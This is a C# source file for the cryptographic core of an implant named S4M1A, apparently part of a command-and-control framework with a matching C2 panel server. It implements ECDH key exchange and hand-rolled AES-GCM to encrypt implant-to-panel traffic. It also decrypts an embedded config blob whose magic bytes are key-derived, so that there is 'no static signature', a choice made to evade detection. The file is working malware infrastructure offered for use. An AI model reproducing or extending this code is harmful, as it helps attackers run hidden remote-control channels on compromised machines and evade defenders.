using System;
using System.IO;
using System.IO.Compression;
using System.Security.Cryptography;
using System.Text;

namespace S4M1A.Implant
{
    // =====================================================================
    //  S4M1A Crypto v2.0 - cryptographic core
    //  ECDH P-256 (CNG) + AES-256-GCM envelope (hand-rolled, no AesGcm
    //  class on .NET Framework 4.x).
    //
    //  WIRE CONTRACT (must match src/Panel/C2Server.cs exactly):
    //    session key = SHA256(ECDH_shared || "S4M1A-KDF1")      // SYNC A
    //    envelope    = magic "S4M1A012"(8) || iv(12) || ct || tag(16) // SYNC B
    //    plaintext   = [0] flag byte (1 = DEFLATE) || payload
    //    ECDH public key = SEC1 uncompressed 0x04 || X(32) || Y(32)
    //
    //  Config blob (separate scheme, see tools/makeconfig.py):
    //    magic(8) || buildId(4) || iv(16) || ct || tag(32) - CBC + HMAC
    // =====================================================================

    public static class Crypto
    {
        // ---------------- session / envelope constants ----------------
        public const int KeyLen      = 32;
        public const int EnvIvLen    = 12;
        public const int EnvTagLen   = 16;
        public const int EnvMagicLen = 8;
        public const int EnvHead     = EnvMagicLen + EnvIvLen; // 20

        // ---------------- config-blob constants (makeconfig.py) ----------------
        public const int MagicLen   = 8;
        public const int BuildIdLen = 4;
        public const int IvLen      = 16;
        public const int TagLen     = 32;

        internal static readonly byte[] Magic  = Encoding.ASCII.GetBytes("S4M1A012");   // SYNC B
        internal static readonly byte[] KdfCtx = Encoding.ASCII.GetBytes("S4M1A-KDF1"); // SYNC A

        private static readonly RNGCryptoServiceProvider Rng =
            new RNGCryptoServiceProvider();

        public static byte[] RandomBytes(int count)
        {
            byte[] b = new byte[count];
            Rng.GetBytes(b);
            return b;
        }

        public static byte[] Sha256(byte[] data)
        {
            using (SHA256 sha = SHA256.Create())
                return sha.ComputeHash(data);
        }

        public static byte[] HmacSha256(byte[] key, byte[] data)
        {
            using (HMACSHA256 h = new HMACSHA256(key))
                return h.ComputeHash(data);
        }

        public static byte[] Xor(byte[] a, byte[] b)
        {
            byte[] r = new byte[a.Length];
            for (int i = 0; i < a.Length; i++) r[i] = (byte)(a[i] ^ b[i]);
            return r;
        }

        public static byte[] Concat(params byte[][] parts)
        {
            int len = 0;
            foreach (byte[] p in parts) len += p.Length;
            byte[] r = new byte[len];
            int o = 0;
            foreach (byte[] p in parts)
            {
                Buffer.BlockCopy(p, 0, r, o, p.Length);
                o += p.Length;
            }
            return r;
        }

        // constant-time comparison - prevents timing attacks on the MAC
        public static bool FixedTimeEquals(byte[] a, byte[] b)
        {
            if (a == null || b == null || a.Length != b.Length) return false;
            int diff = 0;
            for (int i = 0; i < a.Length; i++) diff |= a[i] ^ b[i];
            return diff == 0;
        }

        // ================================================================
        //  Implant config encryption (same scheme as tools/makeconfig.py)
        //  blob : magic(8) || buildId(4) || iv(16) || ct || tag(32)
        // ================================================================

        private static readonly byte[] ConfigTagPlain =
            Encoding.ASCII.GetBytes("S4M1ACFG");

        private const string PadSeed = "S4M1A::KEY::SEED::v2";

        public static byte[] ConfigMagic(byte[] buildKey)
        {
            byte[] h = Sha256(buildKey);
            byte[] m = new byte[MagicLen];
            Buffer.BlockCopy(h, 0, m, 0, MagicLen);
            return Xor(m, ConfigTagPlain);
        }

        // unwraps the build key from the compiled-in EmbeddedKey
        public static byte[] UnwrapBuildKey(byte[] obf, byte[] buildId)
        {
            byte[] seed = Encoding.ASCII.GetBytes(PadSeed);
            byte[] pad = Sha256(Concat(seed, buildId));
            return Xor(obf, pad);
        }

        // decrypts config.bin -> raw JSON, or null on any failure
        public static string OpenConfig(byte[] buildKey, byte[] blob)
        {
            int header = MagicLen + BuildIdLen + IvLen;
            if (blob == null || blob.Length < header + TagLen + 16)
                return null;

            byte[] magic   = new byte[MagicLen];
            byte[] buildId = new byte[BuildIdLen];
            byte[] iv      = new byte[IvLen];
            Buffer.BlockCopy(blob, 0, magic, 0, MagicLen);
            Buffer.BlockCopy(blob, MagicLen, buildId, 0, BuildIdLen);
            Buffer.BlockCopy(blob, MagicLen + BuildIdLen, iv, 0, IvLen);

            int ctLen = blob.Length - header - TagLen;
            byte[] ct = new byte[ctLen];
            Buffer.BlockCopy(blob, header, ct, 0, ctLen);

            byte[] tag = new byte[TagLen];
            Buffer.BlockCopy(blob, blob.Length - TagLen, tag, 0, TagLen);

            // 1) magic is derived from the key - no static signature
            if (!FixedTimeEquals(ConfigMagic(buildKey), magic)) return null;

            // 2) verify HMAC before any decryption
            byte[] hmacKey = Sha256(Concat(buildKey, buildId,
                       Encoding.ASCII.GetBytes("::CFG::HMAC")));
            byte[] calc = HmacSha256(hmacKey, Concat(magic, buildId, iv, ct));
            if (!FixedTimeEquals(calc, tag)) return null;

            try
            {
                return Encoding.UTF8.GetString(AesCbcDecrypt(buildKey, iv, ct));
            }
            catch { return null; }
        }

        private static byte[] AesCbcEncrypt(byte[] key, byte[] iv, byte[] plain)
        {
            using (Aes a = Aes.Create())
            {
                a.KeySize = 256;
                a.BlockSize = 128;
                a.Mode = CipherMode.CBC;
                a.Padding = PaddingMode.PKCS7;
                using (ICryptoTransform t = a.CreateEncryptor(key, iv))
                    return t.TransformFinalBlock(plain, 0, plain.Length);
            }
        }

        private static byte[] AesCbcDecrypt(byte[] key, byte[] iv, byte[] cipher)
        {
            using (Aes a = Aes.Create())
            {
                a.KeySize = 256;
                a.BlockSize = 128;
                a.Mode = CipherMode.CBC;
                a.Padding = PaddingMode.PKCS7;
                using (ICryptoTransform t = a.CreateDecryptor(key, iv))
                    return t.TransformFinalBlock(cipher, 0, cipher.Length);
            }
        }

        // ================================================================
        //  ECDH P-256 SEC1 <-> CNG EccPublicBlob ("ECK1")
        //  Mirrors C2Server.ExportSec1 / ImportSec1 byte-for-byte.
        // ================================================================

        // ECDH public key -> SEC1 uncompressed (0x04 || X || Y = 65 bytes)
        public static byte[] ExportSec1(ECDiffieHellmanCng dh)
        {
            byte[] blob = dh.PublicKey.ToByteArray(); // EccPublicBlob
            byte[] sec1 = new byte[65];
            sec1[0] = 4;
            Buffer.BlockCopy(blob, 8, sec1, 1, 64);
            return sec1;
        }

        // SEC1 uncompressed -> ECDiffieHellmanPublicKey (null on failure)
        public static ECDiffieHellmanPublicKey ImportSec1(byte[] sec1)
        {
            try
            {
                if (sec1 == null || sec1.Length != 65 || sec1[0] != 4) return null;
                byte[] blob = new byte[72];
                blob[0] = 0x45; blob[1] = 0x43; blob[2] = 0x4B; blob[3] = 0x31; // "ECK1"
                blob[4] = 32; blob[5] = 0; blob[6] = 0; blob[7] = 0;           // cbKey = 32 LE
                Buffer.BlockCopy(sec1, 1, blob, 8, 64);
                return ECDiffieHellmanCngPublicKey.FromByteArray(blob,
                    CngKeyBlobFormat.EccPublicBlob);
            }
            catch { return null; }
        }
    }

    // =====================================================================
    //  AES-256-GCM for .NET Framework (no AesGcm class) - hand-rolled
    //  GHASH over GF(2^128) with bit-loop multiply. 96-bit IV, 16-byte
    //  tag, no AAD. Interops with standard GCM implementations.
    //  Cloned from src/Panel/C2Server.cs (must stay identical).
    // =====================================================================
    public static class Gcm
    {
        private const int Br = 16;

        public static byte[] Encrypt(byte[] key, byte[] iv, byte[] plain)
        {
            ICryptoTransform enc = Aes(key);
            byte[] h = BlockEnc(enc, new byte[Br]);
            byte[] j0 = MakeJ0(iv);
            byte[] ct = CounterCipher(enc, j0, plain);
            byte[] s = Ghash(h, ct);
            byte[] t = BlockEnc(enc, j0);
            XorEq(t, s);
            byte[] o = new byte[ct.Length + Br];
            Buffer.BlockCopy(ct, 0, o, 0, ct.Length);
            Buffer.BlockCopy(t, 0, o, ct.Length, Br);
            return o;
        }

        public static byte[] Decrypt(byte[] key, byte[] iv, byte[] ct, byte[] tag)
        {
            ICryptoTransform enc = Aes(key);
            byte[] h = BlockEnc(enc, new byte[Br]);
            byte[] j0 = MakeJ0(iv);
            byte[] s = Ghash(h, ct);
            byte[] t = BlockEnc(enc, j0);
            XorEq(t, s);
            if (!Equal(t, tag)) return null;
            return CounterCipher(enc, j0, ct);
        }

        private static ICryptoTransform Aes(byte[] key)
        {
            System.Security.Cryptography.Aes aes = System.Security.Cryptography.Aes.Create();
            aes.KeySize = 256;
            aes.Key = key;
            aes.Mode = CipherMode.ECB;
            aes.Padding = PaddingMode.None;
            return aes.CreateEncryptor();
        }

        private static byte[] BlockEnc(ICryptoTransform enc, byte[] b)
        {
            byte[] o = new byte[Br];
            enc.TransformBlock(b, 0, Br, o, 0);
            return o;
        }

        private static byte[] MakeJ0(byte[] iv)
        {
            byte[] j0 = new byte[Br];
            Buffer.BlockCopy(iv, 0, j0, 0, 12);
            j0[15] = 1;
            return j0;
        }

        private static void Inc32(byte[] c)
        {
            for (int i = 15; i >= 12; i--)
                if (++c[i] != 0) return;
        }

        private static byte[] CounterCipher(ICryptoTransform enc, byte[] j0, byte[] data)
        {
            byte[] ctr = (byte[])j0.Clone();
            Inc32(ctr);
            byte[] o = new byte[data.Length];
            for (int off = 0; off < data.Length; off += Br)
            {
                byte[] s = BlockEnc(enc, ctr);
                int n = Math.Min(Br, data.Length - off);
                for (int i = 0; i < n; i++) o[off + i] = (byte)(data[off + i] ^ s[i]);
                Inc32(ctr);
            }
            return o;
        }

        private static byte[] Ghash(byte[] h, byte[] ct)
        {
            byte[] y = new byte[Br];
            AddBlocks(h, ct, y);
            byte[] len = new byte[Br];
            PutU64(len, 0, 0);
            PutU64(len, 8, (ulong)ct.Length * 8);
            Mul(Xor16(y, len), h, y);
            return y;
        }

        private static void AddBlocks(byte[] h, byte[] data, byte[] y)
        {
            if (data == null || data.Length == 0) return;
            int i = 0;
            for (; i + Br <= data.Length; i += Br)
                Mul(Xor16(y, Slice(data, i, Br)), h, y);
            if (i < data.Length)
            {
                byte[] last = new byte[Br];
                Buffer.BlockCopy(data, i, last, 0, data.Length - i);
                Mul(Xor16(y, last), h, y);
            }
        }

        // GF(2^128) multiply: z = a * b  (R = x^128 + x^7 + x^2 + x + 1)
        private static void Mul(byte[] a, byte[] b, byte[] z)
        {
            byte[] v = (byte[])b.Clone();
            byte[] r = new byte[Br];
            for (int i = 0; i < 128; i++)
            {
                if ((a[i >> 3] & (byte)(0x80 >> (i & 7))) != 0)
                    XorEq(r, v);
                bool lsb = (v[15] & 1) != 0;
                for (int k = 15; k > 0; k--)
                    v[k] = (byte)((v[k] >> 1) | ((v[k - 1] & 1) << 7));
                v[0] = (byte)(v[0] >> 1);
                if (lsb) v[0] ^= 0xE1;
            }
            Buffer.BlockCopy(r, 0, z, 0, Br);
        }

        private static void PutU64(byte[] b, int off, ulong v)
        {
            for (int i = off + 7; i >= off; i--) { b[i] = (byte)(v & 0xFF); v >>= 8; }
        }

        private static byte[] Xor16(byte[] a, byte[] b)
        {
            byte[] r = new byte[Br];
            for (int i = 0; i < Br; i++) r[i] = (byte)(a[i] ^ b[i]);
            return r;
        }

        private static void XorEq(byte[] a, byte[] b)
        {
            for (int i = 0; i < Br; i++) a[i] ^= b[i];
        }

        private static bool Equal(byte[] a, byte[] b)
        {
            if (a.Length != b.Length) return false;
            int d = 0;
            for (int i = 0; i < a.Length; i++) d |= a[i] ^ b[i];
            return d == 0;
        }

        private static byte[] Slice(byte[] s, int off, int n)
        {
            byte[] r = new byte[n];
            Buffer.BlockCopy(s, off, r, 0, n);
            return r;
        }
    }

    // =====================================================================
    //  Full encrypted session - implant side
    //  Mirrors the panel's per-session ECDH + envelope exactly:
    //    key  = SHA256(shared_secret || "S4M1A-KDF1")   via CNG KDF
    //    env  = magic "S4M1A012"(8) || iv(12) || ct || tag(16)
    // =====================================================================

    public sealed class SessionCrypto : IDisposable
    {
        private readonly ECDiffieHellmanCng _dh;
        private byte[] _key;
        private bool _established;

        public SessionCrypto()
        {
            // Session key = SHA256(shared_secret || KdfCtx) via CNG KDF.
            _dh = new ECDiffieHellmanCng(256);
            _dh.KeyDerivationFunction = ECDiffieHellmanKeyDerivationFunction.Hash;
            _dh.HashAlgorithm = CngAlgorithm.Sha256;
            _dh.SecretAppend = Crypto.KdfCtx;   // SYNC A - must match panel
        }

        // ephemeral public key, placed inside the hello packet (SEC1 65B)
        public byte[] HelloPayload
        {
            get { return Crypto.ExportSec1(_dh); }
        }

        public bool Established { get { return _established; } }

        // called once the panel's public key arrives in the hello reply
        public void Establish(byte[] panelPublic65)
        {
            ECDiffieHellmanPublicKey peer = Crypto.ImportSec1(panelPublic65);
            if (peer == null) throw new ArgumentException("invalid panel public key");
            _key = _dh.DeriveKeyMaterial(peer);
            _established = true;
        }

        // wraps a JSON string into an encrypted envelope (mirrors panel
        // C2Server.EncryptEnv: DEFLATE when payload > 512 bytes)
        public byte[] EncryptEnv(string json)
        {
            if (!_established) throw new InvalidOperationException("session not established");

            byte[] payload = Encoding.UTF8.GetBytes(json ?? "");
            byte[] body;
            if (payload.Length > 512)
            {
                using (MemoryStream o = new MemoryStream())
                {
                    o.WriteByte(1);
                    using (DeflateStream ds = new DeflateStream(o, CompressionMode.Compress, true))
                        ds.Write(payload, 0, payload.Length);
                    body = o.ToArray();
                }
            }
            else
            {
                body = new byte[payload.Length + 1];
                Buffer.BlockCopy(payload, 0, body, 1, payload.Length);
            }

            byte[] iv = Crypto.RandomBytes(Crypto.EnvIvLen);
            byte[] ct = Gcm.Encrypt(_key, iv, body);
            byte[] env = new byte[Crypto.EnvHead + ct.Length];
            Buffer.BlockCopy(Crypto.Magic, 0, env, 0, Crypto.EnvMagicLen);
            Buffer.BlockCopy(iv, 0, env, Crypto.EnvMagicLen, Crypto.EnvIvLen);
            Buffer.BlockCopy(ct, 0, env, Crypto.EnvHead, ct.Length);
            return env;
        }

        // opens an envelope -> decrypted JSON string, or null on failure
        // (mirrors panel C2Server.DecryptEnv including the DEFLATE flag)
        public string DecryptEnv(byte[] blob)
        {
            if (!_established) return null;
            try
            {
                byte[] pt = OpenEnvelope(blob);
                if (pt == null) return null;
                return Encoding.UTF8.GetString(pt);
            }
            catch { return null; }
        }

        private byte[] OpenEnvelope(byte[] blob)
        {
            try
            {
                if (blob == null || blob.Length < Crypto.EnvHead + Crypto.EnvTagLen)
                    return null;
                for (int i = 0; i < Crypto.Magic.Length; i++)
                    if (blob[i] != Crypto.Magic[i]) return null;

                byte[] iv = Slice(blob, Crypto.EnvMagicLen, Crypto.EnvIvLen);
                int ctLen = blob.Length - Crypto.EnvHead - Crypto.EnvTagLen;
                byte[] ct = Slice(blob, Crypto.EnvHead, ctLen);
                byte[] tag = Slice(blob, blob.Length - Crypto.EnvTagLen, Crypto.EnvTagLen);

                byte[] pt = Gcm.Decrypt(_key, iv, ct, tag);
                if (pt == null || pt.Length == 0) return null;

                if (pt[0] == 1)
                {
                    using (MemoryStream ms = new MemoryStream(pt, 1, pt.Length - 1))
                    using (DeflateStream ds = new DeflateStream(ms, CompressionMode.Decompress))
                    using (MemoryStream o = new MemoryStream())
                    {
                        ds.CopyTo(o);
                        return o.ToArray();
                    }
                }
                if (pt[0] != 0) return null;
                byte[] r = new byte[pt.Length - 1];
                Buffer.BlockCopy(pt, 1, r, 0, r.Length);
                return r;
            }
            catch { return null; }
        }

        private static byte[] Slice(byte[] s, int off, int n)
        {
            byte[] r = new byte[n];
            Buffer.BlockCopy(s, off, r, 0, n);
            return r;
        }

        public void Dispose()
        {
            if (_dh != null) _dh.Dispose();
        }
    }
}
